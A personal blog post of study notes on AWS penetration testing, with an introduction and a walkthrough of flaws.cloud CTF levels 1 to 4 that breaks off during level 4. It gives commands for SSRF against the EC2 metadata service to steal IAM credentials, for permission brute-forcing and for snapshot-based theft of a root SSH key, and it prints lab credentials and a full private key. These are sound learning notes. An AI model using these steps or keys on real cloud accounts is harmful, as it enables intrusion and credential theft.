---
layout: single
title:  "Testing pens in heaven"
header:
  overlay_image: /assets/images/banner.jpg
  show_overlay_excerpt: false
---

<b><i>bruno from the future, don't forget to add an index here when you're done</i></b>



# Pentesting cloud environments

It seems there aren't many resources on cloud pentesting, so I decided to take matters into my own hands. I won't create any new learning material, instead I'll aggregate the best free resources I can find. Any CTFs or practical exercises I complete will be documented, as well as any notes I take on theoretical material.

This is more or less the usual process I take whenever I learn a new topic from online resources, only this time I'll be making it public. I'll be focusing on the cloud provider AWS.

For a slightly more readable version, check this post out here


## The plan

* Introductory material
  * <a href="https://www.hackthebox.com/blog/intro-cloud-pentesting">Introduction to Cloud Pentesting</a>
  * <a href="https://www.hackthebox.com/blog/aws-pentesting-guide">AWS penetration testing</a>

* CTFs and hands-on material
  * <a href="http://flaws.cloud/">flaws.cloud</a>
  * <a href="http://flaws2.cloud/">flaws2.cloud</a>
  * <a href="https://pwnedlabs.io/">pwnedlabs.io</a>
  * <a href="https://app.hackthebox.com/fortresses/7">HTB Fortress: AWS</a>
  * <a href="https://github.com/RhinoSecurityLabs/cloudgoat">CloudGoat 2.0</a>
  * <a href="https://github.com/ine-labs/AWSGoat"> AWSGoat</a>

## Other links

* Cheatsheets and references
  * <a href="https://docs.aws.amazon.com/cli/latest/reference/#cli-aws">AWS CLI Documentation</a>
  * <a href="https://hackingthe.cloud/">Hacking The Cloud</a>
  * <a href="https://cloud.hacktricks.wiki/en/index.html">HackTricks Cloud</a>
  * <a href="https://github.com/kh4sh3i/cloud-penetration-testing">kh4sh3i's Cloud pentesting cheatsheet</a>
  * <a href="https://github.com/carnal0wnage/weirdAAL/wiki">WeirdAAAL: AWS Attack Library</a>

* Tools
  * <a href="https://github.com/NetSPI/aws_consoler">AWS Consoler: Convert CLI credentials into console access</a>
  * <a href="https://github.com/zer1t0/awsenum">awsenum: Enumerate AWS permissions and resources</a>
  * <a href="https://github.com/andresriancho/enumerate-iam">Enumerate IAM: Enumerate permissions associated with a credential set</a>
  * <a href="https://github.com/prowler-cloud/prowler">Prowler: Perform automatic security assessment</a>
  * <a href="https://github.com/nccgroup/ScoutSuite">Scout Suite: Highlights risk areas from gathered configuration data</a>


<br>

# Introductory material
## Introduction to cloud pentesting
* The most common cloud security problems are excessive permissions and several kinds of misconfigurations such as ignoring default settings, exposing sensitive data or simply misunderstanding how things work
* A major problem is publicly exposing S3 buckets, there are "search engines" for publicly accessible data in the cloud such as <a href="https://buckets.grayhatwarfare.com/">GrayHat Warfare</a>

<br>

* Try to interact with any S3 buckets you find, for example `https://megabank-supportstorage.s3.amazonaws.com/index-3-1-1144x912.jpg`
  * List files with `aws s3 ls s3://megabank-supportstorage --recursive`
  * Download files (recursively) with `aws s3 sync s3://megabank-supportstorage/pentest_report/ --recursive`

<br>

* **Compute Instance Metadata** is a cloud service which provides administrative endpoints, it's usually bound to the internal IP `169.254.169.254`
* **IMDSv2** will require token authentication to call these endpoints, but not the default **IMDSv1**
* Especially useful when exploiting an SSRF vulnerability, such as `http://megalogistic.htb/status.php?name=169.254.169.254/latest/meta-data/`, this will reveal metadata values

<p align="center">
  <img src="https://github.com/user-attachments/assets/264b0f02-be76-413b-9eaa-850347dd32d3" />
</p>

* Browsing to .../iam/info with the endpoint `http://megalogistic.htb/status.php?name=169.254.169.254/latest/meta-data/iam/info`

<p align="center">
  <img src="https://github.com/user-attachments/assets/7c4bee36-fbac-4cf5-88c6-a3c9843dab56" />
</p>

* Fetch the credentials attached to the EC2 instance with `http://megalogistic.htb/status.php?name=169.254.169.254/latest/meta-data/iam/security-credentials/support`, which reveals the `AccessKeyId`, `SecretAccessKey` and an AWS STS token.
<p align="center">
  <img src="https://github.com/user-attachments/assets/c0baf073-60af-44e6-b13c-a4b05f469e3d" />
</p>

* Use **`aws configure`** to use these credentials, which will save them to `~/.aws/credentials`
* For the session token, use **`aws configure set aws_session_token <token>`**
* Check current identity and privileges, respectively, with **`aws sts get-caller-identity`** and **`aws iam list-attached-user-policies --user-name support`**

<br>

* **S3 buckets** and **Azure/GCP storage buckets** are low hanging fruit but can contain SSH keys, passwords or other sensitive information that might help infiltrate the target (similar to an FTP server if you will)
* Privilege escalation within a cloud service can be useful, not just in the cloud environment as a whole

## AWS penetration testing
Similar to other types of penetration testing, the scoping process should include questions such as:
* How many non-standard AWS IAM policies exist?
* Which services are used?
* How many IAM policies are assigned?
* How many accounts exist?

Keep the **Shared Responsibility Model** in mind: security of the cloud is AWS's responsiblity, security in the cloud is the customer's responsibility

Remember AWS's <a href="https://aws.amazon.com/security/penetration-testing/">policy for penetration testing</a>

<br>

Start by **identifying the attack surface**, determining which services are:
* Used by the application
* Externally exposed
* Managed by AWS or by the customer

Also **enumerate** and **fingerprint** the cloud infrastructure for used components and third-party software. Just like with a web or infra penetration test. **AWS Identity and Access Management (IAM)** can be an interesting source of information

<br>

A few **AWS-specific reconnaissance techniques**:
* Searching the AWS Marketplace for the target organization as teh accountid may be disclosed
* Brute-forcing the account ID via the AWS Sign-In URL: **`https://<accountid>.signin.aws.amazon.com`**
* Searching through public snapshots (i.e EBS snapshots) or AMI Images

<br>

Regarding the **local filesystem**, other tasks besides the typical, non-cloud checks, are:
* Discovery of AWS Access Credentials in home directories and application files
* Verifying access to the **AWS metadata enpoint** at **`https://169.254.169.254/`** or **`http://[fd00:ec2::254]`**

<br>

**AWS Security Tokens** provide temporary, limited-privilege access directly for AWS IAM users or within AWS services. This poses the risk that an attacker could re-use these tokens.

Credentials can be requested via the **AWS metadata service** (see above), which holds different kinds of information split into different categories. The most interesting ones are:
* **iam/info**, containing informaiton about associated IAM roles
* **iam/security-credentials/role-name**, containing temporary security credentials associated with the role

If **Metadata Service Version 2 (IMDSv2)** is used, a token must be crafted. This prevents simple SSRF attacks. But if a user is compromised, you might be able to request an API token from the metadata service 
```
[www-data@manager ~]$ TOKEN=`curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`

[www-data@manager ~]$ echo $TOKEN
AQAAAPjZig94ZtF4xhBwgAATxNGTMMY5Xx6Bu2Hs2Fqp-St5WebEqQ==

[www-data@manager ~]$ curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/dynamic/instance-identity/document
{
  "accountId" : "124253853813",
  "architecture" : "x86_64",
  "availabilityZone" : "eu-central-1a",
  "billingProducts" : null,
  "devpayProductCodes" : null,
  "marketplaceProductCodes" : null,
  "imageId" : "ami-0c0d3776ef525d5dd",
  "instanceId" : "i-067fa056e678575c6",
  "instanceType" : "t2.micro",
  "kernelId" : null,
  "pendingTime" : "2023-02-21T10:30:41Z",
  "privateIp" : "172.31.17.24",
  "ramdiskId" : null,
  "region" : "eu-central-1",
  "version" : "2017-09-30"
}
```

The token can then be used for more juicy requests to the service
```
[www-data@manager ~]$ curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/info
{
  "Code" : "Success",
  "LastUpdated" : "2023-02-21T10:30:44Z",
  "InstanceProfileArn" : "arn:aws:iam::124253853813:instance-profile/ServerManager",
  "InstanceProfileId" : "AIPAWA6NVTVY3D6FKNVMM"
}

[www-data@manager ~]$ curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ServerManager
{
  "Code" : "Success",
  "LastUpdated" : "2023-02-21T10:30:16Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAWA6NVTVYRAJE4MWO",
  "SecretAccessKey" : "DvwdhlDdP13AnTPSgkk5LpToQSQGehcA3JK94gAG",
  "Token" : "IQoJb3JpZ2luX2VjECMaDGV1LWNlbnRyYWwtMSJHMEUCIG9N8Fiy/2ew8j5egLDkoeqF5V3wPwK4jGe4cLAktbaPAiEA7Lo0iVA66CG8aEqNowjAmf4WpaY7dlikuOSXUEfiZ5Uq3wQIvP//////////ARAAGgw0MTQzNTg4MDU4NzMiDBmFU+syY8xirSbpHSqzBKUBkhtt3XJnGJdkbjRY6lywCQnlw8ANYcelnRP00P3dlyIb+QRHhCX4HLuYT7tzytaCNSRHmoEhuPebzxnQOqGVZNT03fseOGdlodl2tA+eX6RIRRwbYoe1TL/CZDltqR84EM7QNsODtTtsXc6LWbnDQH5aY8IhSCGNMyLThcuWxXHz1xXsJpyoSQD5gu1jeRi5wcZceF2P5A+anCV2PGxYGcc8PY4e2ySfL43pWVWJ20et7+lWFUoQgmf6jyiBr6SYr8c76/E98bndzQBnNIoUVjNuUDAvj4x/orFY1onssKMIH8ZUawodh1Q6jw3FTQjSf4rba/aNA4a6vZAnrrUNOsprmoZjv3yx6yHF3g5crL5FX5jPkzSvsz3tOZ9sYUu3g3h3TUjrdlZhA6z2yo/AK7XD7CHa1xwc8FOagBBqRYfGyrL7TNPZXa2EyQkfhI++9EzL4Wpbih/zcVVnlKUfJl610O3X3hJHst6rj6TZAuMP05g8LHdqdIkACFDmcCARKNL7I6KFFPS0sgLqYsu3FkrN55ZXXW4EmvdrnBTmdPfSL9hh77BbLH0uWQU1KhvI5fTmDnUGU24sUF/WQYQQKZShJ0sH82ivEmVFkD7157926d5Hensomg2spNoIXYj+uFGp/iAA9ySEQhz/WGqTJH/GBrp13e0smOusYdU75hg2aax3SPO3m25V29p6WjEajmPpbNkrgHqXXDxqiwF8awNDRuXl0pyPsM00RaW3o/tvMNS60p8GOqkB4S+G+taayWybv6Am85Ae7pSqwfMknjwBZfOTvTbVCydV2RpcZyv1gjqJhOguZZAQzv6rADK2OeBN0bmnNPxY4Om36AQ8eGdpZbs2naGBdCioV5UyLE99Y6dpI9881UG+i9i2qs0EclJLUOgxCdJIlV8j4AgURs2SZeuxfo5ZanG3LubP9BJGGLbLwo5CPDTHA0usGEDYZD1l0A5Ln6mB0EjB2py+g0Omew==",
  "Expiration" : "2023-02-21T17:05:44Z"
}
```

To leverage the extracted secrets in the AWS CLI, fill in **~/.aws/credentials**

```
[default]
aws_access_key_id = ASIAWA6NVTVY5CNUKIUO
aws_secret_access_key = wSHLoJrGVnjfo+xxKwt1cblFpiZgWF20DMxXpTXn
aws_session_token = IQoJb3JpZ2luX2VjECEaDGV1LWNlbnRyYWwtMSJIMEYCIQCnZUyvONtQlYo9E7wvsBQp5yozH/EiPnO4BoXXajyIiwIhAMsOP10IS+ItChhHgzvKMprEPJkKpWl5GKTH3hInYv6gKt8ECLr//////////wEQABoMNDE0MzU4ODA1ODczIgyan7zp7MCE5SEbGO4qswTx/skDLRfBDHMnkXE9rzH7YXvEjXchuasGVywChi9vFyoujll7wc3gmts+LRrgrTC+lV5p/uDC3iHloXiPuEgf6YDRB0OoX4J9jKooGxBAmbdhyvL6kivHlywONtLE8mcf3SrC3ZZqyJ/5KQX+NWNt8Vj1GC/HNssYuToHOLExmUsm5Pw3VgElvcgRaovgU3hwQGLBh7gXCFzp4rAW57jaOcARGQJQr/ONYzgSIZ9LNqMjSBZwREVmTJVhzrDbz7AoPdERnz+K374jd/s+3k7ujBgYxOlk/0Osl7J2+79Wj5+7TDfQXulic/bEwJdCdFX1gcpN5CG3uXnQZQ1USwX4Zb6TSPvHutOOpDjX9pvG2qPt7QC5SV3EuDSOLNvPVrFExOKJcaQhryhZW56hHBpUyVkl5USV2KiAPaniJ6RjYewBX844ddYYaJGp9UEQSxovXPh0mwEKenVTegi3db1bMPkX0CT7IS4GO6bv71/++zQp+pl3fOvp9ixbAa3vzbawLQvpENHpDyRH9K6UT1VPFGK4tbgmrUmBytYp1SKc5UvEDJFg51htlk19MXO3F3fSUWPB5kuo6AEpxnzqElWagBVwswgt6hh0spVjm7PAoO7xTm9yfEc60li/RYGnT4PRQmlbiXiB/sdHVcM29Fmkg7aKo013z06OYNuzIF+Bldf2ziuL8rFM1aU0Af77lUNgpAto0A38iY3a1vBr9xpUJ6ZaXVxMXCbIKG8vTZ94P4f8+TD2idKfBjqoAT5RSXeKY76pZ+P1vOIE+btQjCYsqFzhQwDsk06w+9G89Pa5dVMvhOI0NT0foZeX7aJFhcHigrC5pPkooNQ0wBm1waotdwDTPEKAOwL8HHvtUiuohdR6kYNxKwzqt6g61HcNVd2qzoxf31uDMquXq3OdvcPZHR4LyitKGcptgjQ21ZzcIiuqsqg4k879O8D8v4U3GBSQk7B5UK/2pVKPmqLs/X4cTxUkmQ==
```
<br>

Moving on to the enumeration of **AWS Security Token Permission**, below is a way to first check if the credentials are valid, and then if the user has permissions to run **iam:list-attached-role-policies**

```
[www-data@manager ~]$ aws sts get-caller-identity
{
    "Account": "124253853813", 
    "UserId": "AROAWA6NVTVY4Q3ND6536:i-067fa056e678575c6", 
    "Arn": "arn:aws:sts::124253853813:assumed-role/ServerManager/i-067fa056e678575c6"
}

[www-data@manager ~]$ aws iam list-attached-role-policies --role-name ServerManager
An error occurred (AccessDenied) when calling the ListAttachedRolePolicies operation: User: arn:aws:sts::124253853813:assumed-role/ServerManager/i-067fa056e678575c6 is not authorized to perform: iam:ListAttachedRolePolicies on resource: role ServerManager because no identity-based policy allows the iam:ListAttachedRolePolicies action
```

Permissions can be bruteforced with <a href="https://github.com/andresriancho/enumerate-iam">enumerate-iam</a>. **dynamodb:describe_endpoints** is <a href="https://docs.aws.amazon.com/timestream/latest/developerguide/Using-API.endpoint-discovery.how-it-works.html">a false positive</a>, but the credentials do have access to **ec2:DescribeVolumes** and **ec2:CreateSnapshot** (I don't understand how we know about the latter from the output 🤔).

```
[www-data@manager enumerate-iam-master]#./enumerate-iam.py --access-key ACCESS_KEY --secret-key SECRET_KEY --session-token SESSION_TOKEN
2023-02-23 14:10:27,443 - 3545 - [INFO] Starting permission enumeration for access-key-id "ASIAWA6NVTVYRAJE4MWO"
2023-02-23 14:10:28,083 - 3545 - [INFO] -- Account ARN : arn:aws:sts::124253853813:assumed-role/ServerManager/i-067fa056e678575c6
2023-02-23 14:10:28,084 - 3545 - [INFO] -- Account Id  : 124253853813
2023-02-23 14:10:28,084 - 3545 - [INFO] -- Account Path: assumed-role/ServerManager/i-067fa056e678575c6
2023-02-23 14:10:28,933 - 3545 - [INFO] Attempting common-service describe / list brute force.
2023-02-23 14:10:35,937 - 3545 - [INFO] -- dynamodb.describe_endpoints() worked!
2023-02-23 14:10:36,799 - 3545 - [INFO] -- sts.get_caller_identity() worked!
2023-02-23 14:10:43,106 - 3545 - [INFO] -- ec2.describe_volumes() worked!
```

<br>

Time to **escalate privileges**. An attack path with these privileges is to first list available volumes of the EC2 machines (**ec2:DescribeVolumes**) and then create a publicly available snapshot (**ec2:CreateSnapshot**) of the volume. If a volume is publicly available, this means another AWS user can spin up an EC2 instance and attach the snapshot to their own machine as a second hard drive.

```
[www-data@manager ~]$ aws ec2 describe-volumes
{
    “Volumes”: [
        {
            “AvailabilityZone”: “eu-central-1a”, 
            “Attachments”: [
                {
                    “AttachTime”: “2023-02-21T06:58:45.000Z”, 
                    “InstanceId”: “i-067fa056e678575c6”, 
                    “VolumeId”: “vol-02ca4df63c5cbb8c5”, 
                    “State”: “attached”, 
                    “DeleteOnTermination”: true, 
                    “Device”: “/dev/xvda”
                }
            ], 
            “Encrypted”: false, 
            “VolumeType”: “gp2”, 
            “VolumeId”: “vol-02ca4df63c5cbb8c5”, 
            “State”: “in-use”, 
            “Iops”: 100, 
            “SnapshotId”: “snap-01c4670c36a9740ea”, 
            “CreateTime”: “2023-02-21T06:58:45.361Z”, 
            “MultiAttachEnabled”: false, 
            “Size”: 8
        }
    ]
}
```
Note the **`VolumeID`** to create a snapshot of it later
```
[www-data@manager ~]$ aws ec2 create-snapshot –volume-id vol-02ca4df63c5cbb8c5 –description ‘Y-Security rocks!’
{
    “Description”: “Y-Security rocks!”, 
    “Tags”: [], 
    “Encrypted”: false, 
    “VolumeId”: “vol-02ca4df63c5cbb8c5”, 
    “State”: “pending”, 
    “VolumeSize”: 8, 
    “StartTime”: “2023-02-21T10:40:05.770Z”, 
    “Progress”: “”, 
    “OwnerId”: “124253853813”, 
    “SnapshotId”: “snap-06eedc6a7403eda54”
}
```

When creating a new instance in the same region, the snapshot can be found by searching by the **`OwnerID`**

<p align="center">
  <img src="https://github.com/user-attachments/assets/ac941322-2ecb-4fe4-a21f-5597ad412f59" width="40%">
</p>


After launching the instance, mount the snapshot and access the filesystem to steal root's SSH private key

```
[ec2-user@ip-172-31-31-6 ~]$ sudo mount /dev/sdb1 /media/

[ec2-user@ip-172-31-31-6 ~]$ sudo ls /media/root/.ssh
authorized_keys  id_rsa  id_rsa.pub

[ec2-user@ip-172-31-31-6 ~]$ sudo cat /media/root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEApNvZpkpiPqs6vdoGUXTfnv/ZtS0jk8rOrwi+3B8Kg7D4B4Yx
m31QJGD2t8RUEyjlrqpvoQ5tiq+s0xmxZzBioB2mFTzqV0DzyIZ3+zCHKn07tw26
N+67bWq88LTIHbadUfBiKRg4M9GnX8p1R2n2e9gIIxkBVBEQFmqMuVpg/3Yczww1
9MrpMHEEr0fJWbIr9Sc+1x+smZiJjAvgqGa2GZh0SLv05aVuXOGlpemx2CnFMGM/
9bisIRRgKQCMJqYh/cXf69qv9VL0CLHYh1TdSN87ZnWZeb/KNKd5iETTg5s2C6Jj
13NnNrea+GNYr3xLCUqACFQik1HVTH4ZPLJmvwIDAQABAoIBAB05pDHoidYWQMmb
NveFwobLUGrf36i5kT5STJN1JUYHP1EGJxEre+OXFOWq9kSXQXBfYn6osh6d2gNq
UJq8Zx9/YgvtypVBPHZV8DsldTDBFq7yzgpQVgWloG0Df15VGzqFZMFoO75j8kn2
+Cd6z2lQ+NBQBH5EsBdpOB07umpO2xmPbaBYa51+bFeRjvV8qhf01RrbovwrbeWr
qsr4aUgaOBpvIyszFM+q5ZkBAugLeYyPvKP3/fpEWtgIq4L+0Sch75srQ/ahYLQe
dQjGi0BTCqwWvoglHfID76r6jPSovyLKGY5wGlgUTSouHCEoAVkSsWb2vd/5IUns
ISx5ifECgYEA07vqFKyI1RenI5ZehH9l4uKXAH5bysibK4mkR7WSzKmP26cpkaib
NRqB+EaZlUHHnI+ZkGYxh/DKrCo888DDiS/W7zA0muqcBpU3tInDHYdKa9s2wkL+
lYytWVaVFTHN19omAQRlGaNxtJ8jBe9Nd1+sIMpvKoIkFqRfVX0asxsCgYEAx1Mn
nNBulvDy6WHvx5WDg4oD/ajSvKuFfyAd/bi3s6lVwejv6XeDxGoWOr/mZAuDCyUO
aGUTMhCYNedUavg7nTZl9LgPVuJROs3h2toaRqJJE8hh/per38DVuzXpkGqes+s2
OD3MwR8itHOIXsD5I5S6kOpsa5oJXAzJr672cS0CgYBDa16J3rZjQ/jQeBz4i6hh
qkzyt0l7NI1UO6u3ubVYvdU01/GAk/N34UzpRXG5+Qwaag83z5KN+rpOP9TQuNyK
XlVOLEdT3Mh5wCHQtt0OFfo4hcDV8ocmD3lTLSKjcQxeYvQe9stKcqTOIq4AQcak
8C3a8xqaqn3bR9OjYQaTaQKBgQCcNO62ViJU6D915uqi3ulSDLdT8xo0Abd9CQ53
6GsOwYYTkRlzPdZl9z20jO9hOCRad4/zAEMq2RZwJ/pgWmldq2P7hMOAs5w1GWQG
vyYYdNYQStmBTBvGHrlhHb8NDoGRPqQfL09niZ8JDAGzQEf/Om97YjvVl8H+AYeN
xvAbgQKBgQCAji3zHMwRlh3J2az/vfIY79c1uerNMCNBsFrLH5e9D8Cx+Tq+mWiA
WjGvoMRN0a/mxpqX1WyPDEuwNoT547VnXNo2fKsZjsvqmjMGg5wFh4ERhFczb6gg
+0NbI8C71hiJMqDrYSvax4augU617PfzpR63PIWGxcc8oQe3L6F+kQ==
-----END RSA PRIVATE KEY-----
```

<br>

# CTFs and hands-on material
## flaws.cloud
```
Scope: Everything is run out of a single AWS account, and all challenges are sub-domains of flaws.cloud.
```

### Level 1
```
This level is *buckets* of fun. See if you can find the first sub-domain.
```

Checking if the website is hosted in an S3 bucket
```
┌──(kali㉿kali)-[~]
└─$ nslookup flaws.cloud                                           
Server:         10.0.2.3
Address:        10.0.2.3#53

Non-authoritative answer:
Name:   flaws.cloud
Address: 52.92.152.19
<snip>
                             
┌──(kali㉿kali)-[~]
└─$ nslookup 52.92.152.19
19.152.92.52.in-addr.arpa       name = s3-website-us-west-2.amazonaws.com.
```

And trying to list files inside the S3 bucket. Note how to `--no-sign-request` signals we're trying to access the bucket as an anonymous user
```
┌──(kali㉿kali)-[~]
└─$ aws s3 ls flaws.cloud                             
Unable to locate credentials. You can configure credentials by running "aws configure".
                                                                                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ aws s3 ls flaws.cloud --no-sign-request
2017-03-13 22:00:38       2575 hint1.html
2017-03-02 22:05:17       1707 hint2.html
2017-03-02 22:05:11       1101 hint3.html
2024-02-21 20:32:41       2861 index.html
2018-07-10 11:47:16      15979 logo.png
2017-02-26 19:59:28         46 robots.txt
2017-02-26 19:59:30       1051 secret-dd02c7c.html
```

Curling the secret file, level 1 is solved
```
┌──(kali㉿kali)-[~]
└─$ curl flaws.cloud/secret-dd02c7c.html
<snip>
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_ 
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|
</pre>

<h1>Congrats! You found the secret file!</h1>
</center>

Level 2 is at <a href="http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud">http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</a> 
```
<br>

### Level 2
```
The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this. You just need the free tier.
```

Using the same technique works to verify that it is indeed an S3 bucket
```
┌──(kali㉿kali)-[~]
└─$ nslookup level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud       
Server:         10.0.2.3
Address:        10.0.2.3#53

Non-authoritative answer:
Name:   level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
Address: 52.92.164.11

<snip>                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ nslookup 52.92.164.11                                       
11.164.92.52.in-addr.arpa       name = s3-website-us-west-2.amazonaws.com.
```

But anonymous access doesn't work like before. This will require setting up an AWS account and configuring the credentials with the **`aws configure`** command. This should be more or less straight forward

I did run into a problem - `An error occurred (SignatureDoesNotMatch) when calling the GetCallerIdentity operation` - which I believe is related to my Kali's messed up timezone. I play a lot of CTFs and sometimes I have to synchronize my clock with different Kerberos servers. I solved this with **`sudo timedatectl set-ntp true`**

Anyway, after setting up the credentials, the same command will work since it automatically assumes the AWS profile

```
┌──(kali㉿kali)-[~/.aws]
└─$ aws s3 ls level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud  
2017-02-26 21:02:15      80751 everyone.png
2017-03-02 22:47:17       1433 hint1.html
2017-02-26 21:04:39       1035 hint2.html
2017-02-26 21:02:14       2786 index.html
2017-02-26 21:02:14         26 robots.txt
2017-02-26 21:02:15       1051 secret-e4443fc.html
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/.aws]
└─$ curl level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html
<snip>
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_ 
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|
</pre>

<h1>Congrats! You found the secret file!</h1>
</center>


Level 3 is at <a href="http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud">http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</a>
```

<br>

### Level 3

```
The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are.
```

Once again confirming we're working with an S3 bucket...
```
┌──(kali㉿kali)-[~/.aws]
└─$ nslookup level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
Server:         10.0.2.3
Address:        10.0.2.3#53

Non-authoritative answer:
Name:   level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
<snip>
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/.aws]
└─$ nslookup 52.92.238.91                                       
91.238.92.52.in-addr.arpa       name = s3-website-us-west-2.amazonaws.com.
```
And listing the files works again. Note how this is a git directory
```
┌──(kali㉿kali)-[~/.aws]
└─$ aws s3 ls level3-9afd3927f195e10225021a578e6f78df.flaws.cloud 
                           PRE .git/
2017-02-26 19:14:33     123637 authenticated_users.png
2017-02-26 19:14:34       1552 hint1.html
2017-02-26 19:14:34       1426 hint2.html
2017-02-26 19:14:35       1247 hint3.html
2017-02-26 19:14:33       1035 hint4.html
2020-05-22 14:21:10       1861 index.html
2017-02-26 19:14:33         26 robots.txt

```
After downloading the entire bucket and running the command **`git log`** to see commit history, it seems like Scott committed something interesting by accident
```
┌──(kali㉿kali)-[~/Desktop/bucket]
└─$ aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ .             
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/HEAD to .git/HEAD
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/config to .git/config
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/description to .git/description
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/COMMIT_EDITMSG to .git/COMMIT_EDITMSG
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/post-update.sample to .git/hooks/post-update.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/pre-applypatch.sample to .git/hooks/pre-applypatch.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/applypatch-msg.sample to .git/hooks/applypatch-msg.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/pre-rebase.sample to .git/hooks/pre-rebase.sample
<snip>

┌──(kali㉿kali)-[~/Desktop/bucket]
└─$ git log  
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

    first commit
```
To see what was committed by accident, use **`git checkout`** followed by the hash token. We got access keys!
```
┌──(kali㉿kali)-[~/Desktop/bucket]
└─$ git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
M       index.html
Previous HEAD position was b64c8dc Oops, accidentally added something I shouldn't have
HEAD is now at f52ec03 first commit
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/bucket]
└─$ ls -alh
total 164K
drwxrwxr-x 3 kali kali 4.0K Oct  9 12:49 .
drwxr-xr-x 3 kali kali 4.0K Oct  9 12:45 ..
drwxrwxr-x 7 kali kali 4.0K Oct  9 12:49 .git
-rw-rw-r-- 1 kali kali   91 Oct  9 12:49 access_keys.txt
-rw-rw-r-- 1 kali kali 121K Feb 26  2017 authenticated_users.png
-rw-rw-r-- 1 kali kali 1.6K Feb 26  2017 hint1.html
-rw-rw-r-- 1 kali kali 1.4K Feb 26  2017 hint2.html
-rw-rw-r-- 1 kali kali 1.3K Feb 26  2017 hint3.html
-rw-rw-r-- 1 kali kali 1.1K Feb 26  2017 hint4.html
-rw-rw-r-- 1 kali kali 1.9K May 22  2020 index.html
-rw-rw-r-- 1 kali kali   26 Feb 26  2017 robots.txt
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/bucket]
└─$ cat access_keys.txt 
access_key AKIAJ366LIPB4IJKT7SA
secret_access_key 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
```

Use **`aws configure`** to configure a new profile with the stolen keys, followed by a call to the S3 service to list buckets we now have access to
```
┌──(kali㉿kali)-[~/Desktop/bucket]
└─$ aws s3 ls --profile pwned                                              
2017-02-12 16:31:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2017-05-29 12:34:53 config-bucket-975426262029
2017-02-12 15:03:24 flaws-logs
2017-02-04 22:40:07 flaws.cloud
2017-02-23 20:54:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-26 13:15:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2017-02-26 13:16:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2017-02-26 14:44:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2017-02-26 14:47:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2017-02-26 15:06:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
```

Obviously hacker-me immediately tried browsing to levels 5 and 6, but that won't work :p 

<br>

### Level 4

```
For the next level, you need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it.
```
Sounds like we'll be stealing and loading someone else's snapshot.
First gathering some information about the bucket and the hijacked user
```
┌──(kali㉿kali)-[~/Desktop/bucket]
└─$ host 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud is an alias for ec2-54-202-228-246.us-west-2.compute.amazonaws.com.
ec2-54-202-228-246.us-west-2.compute.amazonaws.com has address 54.202.228.246
                                                                                                                                                                                                                                            
